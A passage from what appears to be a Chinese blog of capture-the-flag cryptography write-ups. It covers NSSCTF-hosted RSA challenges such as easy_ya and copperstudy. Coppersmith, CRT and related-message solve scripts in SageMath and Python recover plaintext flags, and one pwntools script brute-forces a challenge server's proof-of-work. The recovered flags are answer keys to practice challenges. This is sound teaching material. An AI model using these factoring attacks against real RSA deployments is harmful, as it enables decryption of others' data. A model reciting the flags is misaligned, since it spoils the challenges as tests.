class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br><br>c2=<span class="hljs-number">0x3a80caebcee814e74a9d3d81b08b1130bed6edde2c0161799e1116ab837424fbc1a234b9765edfc47a9d634e1868105d4458c9b9a0d399b870adbaa2337ac62940ade08daa8a7492cdedf854d4d3a05705db3651211a1ec623a10bd60596e891ccc7b9364fbf2e306404aa2392f5598694dec0b8f7efc66e94e3f8a6f372d833941a2235ebf2fc77c163abcac274836380045b63cc9904d9b13c0935040eda6462b99dd01e8230fdfe2871124306e7bca5b356d16796351db37ec4e574137c926a4e07a2bfe76b9cbbfa4b5b010d678804df3e2f23b4ec42b8c8433fa4811bf1dc231855bea4225683529fad54a9b539fe824931b4fdafab67034e57338217f</span><br>high_p2=<span class="hljs-number">0xa9cb9e2eb43f17ad6734356db18ad744600d0c19449fc62b25db7291f24c480217d60a7f87252d890b97a38cc6943740ac344233446eea4084c1ba7ea5b7cf2399d42650b2a3f0302bab81295abfd7cacf248de62d3c63482c5ea8ab6b25cdbebc83eae855c1d07a8cf0408c2b721e43c4ac53262bf9aaf7a000000000000000</span><br>e2=<span class="hljs-number">0x10001</span><br>n2=<span class="hljs-number">0x841a5a012c104e600eca17b451d5fd37c063ad347707a2e88f36a07e9ad4687302790466e99f35b11580cbe8b0a212e6709686c464a6393c5895b1f97885f23ea12d2069eb6dc3cb4199fb8c6e80a4a94561c6c3499c3c02d9dc9cf216c0f44dc91701a6d9ec89981f261a139500420a51014492f1da588a26e761439dd5739b32540ca6dc1ec3b035043bc535304a06ccb489f72fcd1aa856e1cffe195039176937f9a16bd19030d1e00095f1fd977cf4f23e47b55650ca4712d1eb089d92df032e5180d05311c938a44decc6070cd01af4c6144cdab2526e5cb919a1828bec6a4f3332bf1fa4f1c9d3516fbb158fd4fbcf8b0e67eff944efa97f5b24f9aa65</span><br><br>unknown_bits=<span class="hljs-number">60</span><br>R.&lt;x&gt; = PolynomialRing(Zmod(n2))<br>f = high_p2 + x<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br>p2=<span class="hljs-built_in">int</span>(high_p2+x[<span class="hljs-number">0</span>])<br>m2=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c2,invert(e2,(p2-<span class="hljs-number">1</span>)*(n2//p2-<span class="hljs-number">1</span>)),n2)))<br><br>c3=<span class="hljs-number">0x1bd2a47a5d275ba6356e1e2bd10d6c870693be540e9318c746e807a7672f3a75cc63841170126d7dba52d7f6f9cf0f8dce9705fc1785cc670b2658b05d4b24d8918f95594844bfa920c8ffe73160c2c313b3fdbc4541ec19828165e34afa7d05271cc6fd59d08138b88c11677e6ac3b39cff525dcb19694b0388d895f53805a5e5bd8cfb947080e4855aaf83ebd85a397526f7d76d26031386900cb44a2e4bd121412bcee7a6c1e9af411e234f130e68a428596265d3ec647e50f65cb81393f4bd38389a2b9010fd715582506b9054dc235aced50757462b77a5606f116853af0c1ea3c7cf0d304f885d86081f8bac8b67b0625122f75448c5b6eb8f1cc8a0df</span><br>n3=<span class="hljs-number">0xc2b17c86a8950f6dafe0a633890e4271cfb20c5ffda2d6b3d035afa655ed05ec16c67b18832ed887f2cea83056af079cc75c2ce43c90cce3ed02c2e07d256f240344f1734adeee6dc2b3b4bbf6dcfc68518d0a74e3e66f1865db95ef4204457e6471903c2321ac97f3b8e3d8d935896e9fc9145a30a3e24e7c320490a9944c1e94d301c8388445532699e6189f4aa6a86f67f1d9b8fb0de4225e005bd27594cd33e36622b2cd8eb2781f0c24d33267d9f29309158942b681aab81f39d1b4a73bd17431b46a89a0e4c2c58b1e24e850355c63b72392600d3fff7a16f6ef80ea515709da3ef1d28782882b0dd2f76bf609590db31979c5d1fd03f75d9d8f1c5069</span><br>e3=<span class="hljs-number">0x10001</span><br>p3=<span class="hljs-built_in">int</span>(gcd(n3,c3))<br>m3=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c3,invert(e3,(p3-<span class="hljs-number">1</span>)*(n3//p3-<span class="hljs-number">1</span>)),n3))<br>m3=long_to_bytes(m3//(p3*<span class="hljs-number">2022</span>*<span class="hljs-number">1011</span>))<br><span class="hljs-built_in">print</span>(m1+m2+m3)<br><span class="hljs-comment">#b&#x27;PCL&#123;16745c3b0c134c83b74f977260aae9b5&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;16745c3b0c134c83b74f977260aae9b5&#125;</span><br></code></pre></td></tr></table></figure><h1 id="红明谷ctf-2022easy_ya"><a class="markdownIt-Anchor" href="#红明谷ctf-2022easy_ya"></a> [红明谷CTF 2022]easy_ya</h1><h2 id="题目-17"><a class="markdownIt-Anchor" href="#题目-17"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>():<br>    e = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            p = getPrime(<span class="hljs-number">512</span>)<br>            q = getPrime(<span class="hljs-number">512</span>)<br>            n = p*q<br>            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>            d = inverse(e,phi)<br>            <span class="hljs-keyword">return</span> p,q,d,n,e<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span><br>p,q,d,n,e = gen()<br>r = getPrime(<span class="hljs-number">512</span>)<br>m = bytes_to_long(flag+os.urandom(<span class="hljs-number">32</span>))<br>M = m%r<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r = %d&quot;</span>%r)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;M = %d&quot;</span>%M)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = %d&quot;</span>%n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e = %d&quot;</span>%e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = %d&quot;</span>%c)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473</span><br><span class="hljs-string">M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558</span><br><span class="hljs-string">n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287</span><br><span class="hljs-string">e = 3</span><br><span class="hljs-string">c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="分析-17"><a class="markdownIt-Anchor" href="#分析-17"></a> 分析</h2><p>还是利用CopperSmith</p><p>具体原理我也不清楚，只知道能这么做（哭</p><h2 id="exp-17"><a class="markdownIt-Anchor" href="#exp-17"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>r = <span class="hljs-number">7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473</span><br>M = <span class="hljs-number">4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558</span><br>n = <span class="hljs-number">131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282</span><br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (M+x*r)^e-c<br>f = f.monic()<br>x = f.small_roots()<br><span class="hljs-keyword">if</span> x:<br>    <span class="hljs-built_in">print</span>(x)<br>    m=<span class="hljs-built_in">int</span>(M+x[<span class="hljs-number">0</span>]*r)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#[810968823598060539864535]</span><br><span class="hljs-comment">#b&#x27;flag&#123;53a2e494-964d-4506-a2c4-c34b9475dedd&#125;W\xf1X6\xacP\x9bc~9\xfd\x0f\x96\xbf\x92\xb9+\xe5\xebPJ\x17\xc4\xb2\xe8\xad\x01\n\xf2j\xae\x15&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;53a2e494-964d-4506-a2c4-c34b9475dedd&#125;</span><br></code></pre></td></tr></table></figure><h1 id="强网杯-2019copperstudy"><a class="markdownIt-Anchor" href="#强网杯-2019copperstudy"></a> [强网杯 2019]copperstudy</h1><h2 id="题目-18"><a class="markdownIt-Anchor" href="#题目-18"></a> 题目</h2><p>没有附件，nc上去看</p><h2 id="分析-18"><a class="markdownIt-Anchor" href="#分析-18"></a> 分析</h2><p>（建议先看[GWCTF 2019]BabyRSA2，学会直接在vscode里执行sage，因为涉及到nc，然后可以自己试试直接在一个exp里完成）</p><p>越做越疯，很糟糕</p><p>全是找板子，想看原理看具体exp里然后取搜吧</p><p>这里是有板子</p><h2 id="exp-18"><a class="markdownIt-Anchor" href="#exp-18"></a> exp</h2><h3 id="第一步"><a class="markdownIt-Anchor" href="#第一步"></a> 第一步</h3><p>nc连接，然后直接爆破</p><p>之后保持连接，后面就手动输入了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br>p=remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28421</span>)<br><span class="hljs-built_in">print</span>(p.recvline())<br>p.recvuntil(<span class="hljs-string">b&#x27;hexdigest()=&#x27;</span>)<br>sha=(p.recvline().decode()).strip()<br><span class="hljs-built_in">print</span>(sha.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;skr[0:5].encode(&#x27;hex&#x27;)=&quot;</span>)<br>pre_skr=(p.recvline().decode()).strip()<br><span class="hljs-built_in">print</span>(pre_skr.encode())<br><span class="hljs-built_in">print</span>(p.recvuntil(<span class="hljs-string">b&quot;skr.encode(&#x27;hex&#x27;)=&quot;</span>))<br>temp=<span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>fl=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> temp:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> temp:<br>                <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> temp:<br>                    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> temp:<br>                        skr=<span class="hljs-built_in">int</span>(pre_skr+i+j+k+l+m+n,<span class="hljs-number">16</span>)<br>                        skr=long_to_bytes(skr)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(hashlib.sha256(skr).hexdigest()) == sha:<br>                            <span class="hljs-built_in">print</span>(skr.<span class="hljs-built_in">hex</span>())<br>                            p.sendline(<span class="hljs-built_in">str</span>(skr.<span class="hljs-built_in">hex</span>()).encode())<br>                            fl=<span class="hljs-number">1</span><br>                            <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> fl:<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> fl:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> fl:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> fl:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> fl:<br>        <span class="hljs-keyword">break</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="第二步"><a class="markdownIt-Anchor" href="#第二步"></a> 第二步</h3><p>m的高位攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n=<span class="hljs-number">16017962047981034439379147851871655991715523372130499591852000402972024053592619510623839612271064518084046813489696243662115859838347110076313512984252332977601217689166917112436536161737721874651780063000862202462029857462549195260675764694966296233199436592988341616312096302239910999510720139029804993110147203819277344583064534236243526036059624654235721115483341283815742379122011040983246073311540204563363560614990222916022071722333723544827566195478776465318605614524315368708097920766178242152179015998515592146063110842222141971840122508556233670514825282525191089330615519445235293437744571216306171297139</span><br>e= <span class="hljs-number">3</span><br>m_high=<span class="hljs-number">653524334392227600570363162383764937305248031854419023410931365363426067123844229856737844264960</span><br>c=<span class="hljs-number">279116358436840580445598969421610529050633733034686489455738062242484915123166426001912178374020325810905517077211915812323425704202427412835294016600968491811813422933962866712907267434038126911651594486545661906271625545257899553405201093150339568388337402642643112619054191820421155173</span><br>unknown_bits=<span class="hljs-number">72</span><br><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>m = m_high + x<br>f = m^e - c<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br><span class="hljs-keyword">if</span> x:<br>    m = m_high + x[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#4e53534354467b35643366363566366163303966613064303162383838626336643335616234347d</span><br></code></pre></td></tr></table></figure><h3 id="第三步"><a class="markdownIt-Anchor" href="#第三步"></a> 第三步</h3><p>p高位攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n=<span class="hljs-number">23412744196435681035016886220643400350970797545501310013304272571425348967576484268142400640552976798425045608274973517284025831498467236341911890721102753724816097043557304340791745423642403094886324667586890743441181879275819905523857289371181975206153946416492759491324890990771260876302417738635652747674766470906230972589393979314947350143584541009374774851236081699644040090877016127125997472439169352089823014941009458298353952133084702487229994974065020835757669357061533853531708873378901690969236981895123027779256185848480947387458247076558510061941953938352870386545064169169200268143031918794825270298631</span><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">9398872900480694514053766636015808474916722324451384224067138680826665766000870773107410167898882406270257015221891892085001459713583625341362117117871802743137635415088841771727308157301268300094318585426138274238719361978001009950762135079902183427948096280119330118607820781873262983642485251440958841901313115939514261290900440121234463088422361021316299407329969835177481638764778578537907012916110360538977789500099230565812930941982075719936200613719978050626787999136833805067940187341360786050332115552930420848777154904971863171308444262963588775160727678158622484428491558915905860791139989357158989913050</span><br>high_p=<span class="hljs-number">136232996027545975004563119617198627048065138315684770279122430141624103589614249447456579821863618044683199820893874027883593009896002870850519475109346672955929930383822711173403482003043608577119957883570354552011936964395584718847162648784196596548570670949314203035203058272377061576666254342055958413312</span><br>unknown_bits=<span class="hljs-number">128</span><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = high_p + x<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br><span class="hljs-keyword">if</span> x:<br>    p=<span class="hljs-built_in">int</span>(high_p+x[<span class="hljs-number">0</span>])<br>    q=n//p<br>    phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    d=invert(e,phi)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n))).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#4e53534354467b32393537633039333964393165633765633331306462356630616130303637627d</span><br></code></pre></td></tr></table></figure><h3 id="第四步"><a class="markdownIt-Anchor" href="#第四步"></a> 第四步</h3><p>d低位攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage    </span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getFullP</span>(<span class="hljs-params">low_p, n</span>):<br>    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="hljs-string">&#x27;NTL&#x27;</span>)<br>    p = x * <span class="hljs-number">2</span> ^ bit + low_p<br>    root = (p - n).monic().small_roots(X=<span class="hljs-number">2</span> ^ <span class="hljs-number">128</span>, beta=<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> root:<br>        <span class="hljs-keyword">return</span> p(root[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phase4</span>(<span class="hljs-params">low_d,n,c,e</span>):<br>    maybe_p = []<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>):<br>        p = var(<span class="hljs-string">&#x27;p&#x27;</span>)<br>        p0 = solve_mod([<span class="hljs-number">3</span> * p * low_d == p + k * (n * p - p ^ <span class="hljs-number">2</span> - n + p)], <span class="hljs-number">2</span> ^ bit)<br>        maybe_p += [<span class="hljs-built_in">int</span>(x[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> p0]<br>    <span class="hljs-comment"># print(maybe_p)</span><br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> maybe_p:<br>        P = getFullP(x, n)<br>        <span class="hljs-keyword">if</span> P: <span class="hljs-keyword">break</span><br><br>    P = <span class="hljs-built_in">int</span>(P)<br>    Q = n // P<br><br>    <span class="hljs-keyword">assert</span> P * Q == n<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;P = &quot;</span>,P)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Q = &quot;</span>,Q)<br><br>    d = inverse_mod(<span class="hljs-number">3</span>, (P - <span class="hljs-number">1</span>) * (Q - <span class="hljs-number">1</span>))<br>    m = <span class="hljs-built_in">pow</span>(c,d,n)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)).<span class="hljs-built_in">hex</span>())<br><br>low_d = <span class="hljs-number">9973904680412152570138003136466059609611257944928836300634423080561298749075958309067426603113525684100417494741123226214436236190592552869975926519409611</span><br>bit = low_d.nbits()<br>n = <span class="hljs-number">114977856718774899746007273258142027119221291891045313370664580956945773892016230637680441795343679791416907107771431518072494779758596070931073345264743927090857036312767418019303974408803896285561003981790474474879254339898650912349447554900342592699419248042230565484734565275290033575309907770959979249441</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">279116358436840580443869403482689523417926943370283952754967172903129298280404573580346506496192282092683784627132866212050801891387341516024550585731142831756181412863049450540988286305848774162564019517973339661098414905264661903203165067354388671494408807585235845183100544469908026469</span><br><br>phase4(low_d,n,c,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;over&quot;</span>)<br><br><span class="hljs-comment">#P =  9391440826233377371336657018726228044955035660871483031200545194209412258251390818401701331464535153201228754160435275219818869242505918168666443009326573</span><br><span class="hljs-comment">#Q =  12242834602929509975987801546676877090198837325930397169155103539567125515140067665313945532401676516599948815186229719968852154887325536081734280242134917</span><br><span class="hljs-comment">#4e53534354467b35613766336538663162393366623031373734353635393137353330373233657d</span><br><br></code></pre></td></tr></table></figure><h3 id="第五步"><a class="markdownIt-Anchor" href="#第五步"></a> 第五步</h3><p>中国剩余定理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n1=<span class="hljs-number">70150782017106744702286811194970924795928560711094108957698212389450273692062768369571246611319149038648327761674152952339905197695826737596960300577409503979703942545335432723800249192593500405582765931990758208650822157232981240732073491803602882507450974334286908867409590191359365352766613583499469290527</span><br>c1=<span class="hljs-number">279116358436840580122801369030860797071717129802018282437018488673976577326106718472074964408957326212618048865436045226170032031901019679413199602348078729644581348770787396528963958874221694545619137696961058855467066695666042795471835004925286023187346469299975149390451496495239926629</span><br>n2=<span class="hljs-number">162923886897767641573990199711208966404485491217179966579970401560714596746048441376917770043182383221870895215113078186461513007410215100878491414297440280939964180092659379220178207225568061030068648967857348433089303371603266843183223035463682063557841392298863456665960447294704243819193928375408330671631</span><br>c2=<span class="hljs-number">279116358436840580122801369030860797071717129802018282437018488673976577326106718472074964408957326212618048865436045226170032031901019679413199602348078729644581348770787396528963958874221694545619137696961058855467066695666042795471835004925286023187346469299975149390451496495239926629</span><br>n3=<span class="hljs-number">64753773112870123671946228401261981403081286742676725931583667929772070753859231199873341111781336775967007272149447053104007491713851164173612962580712278731622434533504364107395371718249464189400149469043191006088911663789316310304257096522277791717333432302300795390616581016561592287175185617125932272419</span><br>c3=<span class="hljs-number">279116358436840580122801369030860797071717129802018282437018488673976577326106718472074964408957326212618048865436045226170032031901019679413199602348078729644581348770787396528963958874221694545619137696961058855467066695666042795471835004925286023187346469299975149390451496495239926629</span><br><br>c=[c1,c2,c3]<br>n=[n1,n2,n3]<br><span class="hljs-comment">#使用中国余数定理计算m的e次方</span><br>x = crt([n1, n2, n3], [c1, c2, c3], check=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(iroot(x[<span class="hljs-number">0</span>],<span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h3 id="第六步"><a class="markdownIt-Anchor" href="#第六步"></a> 第六步</h3><p>m相关攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">m1=a1*m+b1</span><br><span class="hljs-string">m2=a2*m+b2</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>n=<span class="hljs-number">26847996488880447216096776732070281545074976645749840223230511101684036430699982494901520391374124676936370320908977030678422411113870898677919949108092307560814359856349235904175523637127826401779533321668448534998775648599423127487483632410155870352622828098410769325273126586866498178208776567574352828392125983672996446308065758934722526747310236556876750508203459413705807255650618685650750523570744211286546519649176886249835233519536394639538776259162929144979062059559775101414000670212721128884382352735794626563622728463436421772307972139931705536741059161551098795715075350442339804773649281544806370921391</span><br>a1=<span class="hljs-number">1</span><br>b1=<span class="hljs-number">0</span><br>c1=<span class="hljs-number">24732899138985698048124738358885344459379493315054027124307662756312751844141022376300081819454686750145220818897973180537017198314231472874483596104799907859093488291789788924219598121824323245537546195418486119678702901179691397376775826957705715693979193211784497213599547621382217619658749166534139290785718885852449894739032293904252938440995047190420058143769116751715376151332965862901010949911088033051288770545272582507845444790953964807440668028480049740511795701814222210845363937718599750472068452173181280703803935942166980836867264796046582678020913725095981275231662933966865789526710944092564302745232</span><br>a2=<span class="hljs-number">1</span><br>b2=<span class="hljs-number">1</span><br>c2=<span 